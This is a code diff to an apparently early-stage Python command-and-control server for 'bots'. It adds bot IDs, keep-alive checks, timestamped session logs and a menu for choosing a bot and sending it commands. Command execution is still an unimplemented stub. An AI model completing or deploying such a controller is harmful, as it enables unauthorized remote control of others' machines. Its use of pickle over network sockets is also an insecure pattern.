@@ -1,5 +1,12 @@
+import random
 import socket, pickle, security
+import string
 import threading, traceback
+import time
+from consolemenu import *
+from consolemenu.items import *
+from datetime import datetime
+from copy import deepcopy
 
 addr = ('127.0.0.1', 5000)
 decryptor = security.get_decryptor()
@@ -13,26 +20,57 @@ def is_int(str):
     except:
         return False
 
+def get_choice(opts, title):
+    opt = None
+    while not opt or not is_int(opt) or not 1 <= int(opt) <= len(opts):
+        menu = title + '\n'
+        for opt in enumerate(opts):
+            menu += f'{opt[0] + 1}. {opt[1]}\n'
+        menu = menu[:-1]
+        print(menu)
+        opt = input('> ')
+    return int(opt) - 1
+
+def get_user(id):
+    for user in users:
+        if user.id == id:
+            return user
+
 class User():
     def __init__(self, conn):
         self.conn = conn
         self.ip, self.port = conn[1][0], conn[1][1]
         self.hist = []
         self.msg = None
+        self.alive = True
+        self.id = ''.join(random.choices(string.ascii_lowercase, k=8))
+        threading.Thread(target=self.keep_alive, args=()).start()
+
+    def keep_alive(self):
+        while True:
+            try:
+                self.conn[0].send(pickle.dumps('keepalive'))
+                time.sleep(3)
+            except:
+
+                self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
+                self.alive = False
+                return
 
     def send(self, msg):
         self.conn[0].send(pickle.dumps(msg))
-        self.hist.append({'from': 'server', 'msg': msg})
+        self.hist.append({'from': 'server', 'msg': msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
 
     def read(self):
         try:
             self.msg = self.conn[0].recv(4096)
             self.msg = clean(self.msg)
-        except ConnectionAbortedError: #todo this might not work when not on 127.0.0.1
-            self.hist.append({'from': 'server', 'msg': 'client disconnected'})
+        except: #todo this might not work when not on 127.0.0.1
+            self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
+            self.alive = False
             return -2
         if self.msg != -1:
-            self.hist.append({'from': 'client', 'msg': self.msg})
+            self.hist.append({'from': 'client', 'msg': self.msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
             return self.msg
 
 def clean(msg):
@@ -43,52 +81,53 @@ def clean(msg):
         return -1
 
 def handle_user(user):
-    while True:
+    while user.alive: #todo maybe dont stop monitoring on dc?
         msg = user.read()
         if msg:
             if msg == -2:
-                #todo maybe dont stop monitoring on dc?
                 #print(f'{user.ip}:{user.port} disconnected')
                 return
             else:
                 #print(f'msg recv from user at {user.ip}:{user.port}: {msg}')
-                user.send('msg from server')
+                user.send('Msg from server')
         else:
             #todo make this better
             #print(f'invalid msg recv from {user.ip}:{user.port}, notifying client')
-            user.send('invalid input recv')
+            user.send('Invalid input recieved')
 
-def get_instructions():
-    instruction = None
-    while instruction not in [1, 2]:
-        print('''
-Options:
-1. View running bots
-2. Remove inactive bots''')
-        instruction = is_int(input('Chose a number: '))
-        if instruction not in [1, 2]:
-            print('Invalid option')
-    if instruction == 1:
-        instruction = None
-        while instruction not in [x for x in range(0, len(users) + 1)]:
-            msg = 'Running bots:\n'
-            for user in enumerate(users):
-                msg += f'{user[0] + 1}. {user[1].ip}:{user[1].port}\n'
-            msg += '0. Back'
-            print(msg)
-            instruction = is_int(input('Chose a number: '))
-            if instruction not in [x for x in range(0, len(users) + 1)]:
-                print('Invalid option')
-        #todo menu logic - https://console-menu.readthedocs.io/en/latest/
-    else:
-        pass
-
+def get_instructions(): #todo add file down/uploading from bot, add more options
+    opt = get_choice(['Select a bot'], 'Main Menu')
+    #opt = SelectionMenu.get_selection(['Select a bot'], 'Main Menu')
+    if opt == 0:
+        curr_users = [u.id for u in users]  # in case list of users changes before selection made
+        opt = get_choice([f'{user.ip}:{user.port}' for user in users] + ['Main Menu'], 'Select a bot:' if len(users) > 0 else 'Select a bot:\nNo bots found!!!')
+        #opt = SelectionMenu.get_selection([f'{user.ip}:{user.port}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='No bots found!!' if len(users) <= 0 else None)
+        if opt == len(curr_users):
+            get_instructions()
+        else:
+            selected_user = curr_users[opt] #in case users list indexes change, can still get intented user using get_user(selected_user.id)
+            bot_opts = ['Send a command', 'View bot session logs', 'Main Menu']
+            opt = get_choice(bot_opts, 'Choose an action:')
+            #opt = SelectionMenu.get_selection(bot_opts, 'Choose an action:')
+            if opt == len(bot_opts) - 1:
+                get_instructions()
+            elif opt == 0:
+                cmd = input('Enter a command: ')
+                confirm = input(f'Are you sure you would like to run "{cmd}" on {get_user(selected_user).ip}:{get_user(selected_user).port}? (y/n) ')
+                if confirm.lower().startswith('y'):
+                    print(f'Running command...')
+                    print('TODO make command actually run') #TODO make command actually run
+                get_instructions()
+            elif opt == 1:
+                for msg in get_user(selected_user).hist: #todo just give last 100 lines? add option for full?
+                    print(f'{msg["timestamp"]} | {msg["from"]}: {msg["msg"]}')
+                get_instructions()
 
 def run():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(addr)
     server.listen()
-    print(f'server running on {addr[0]}:{addr[1]}')
+    print(f'Server running on {addr[0]}:{addr[1]}')
 
     threading.Thread(target=get_instructions, args=()).start()
 
@@ -96,7 +135,6 @@ def run():
         conn = server.accept()
         user = User(conn)
         users.append(user)
-        #print(f'connection recv from {user.ip}:{user.port}')
         threading.Thread(target=handle_user, args=(user, )).start()
 
 
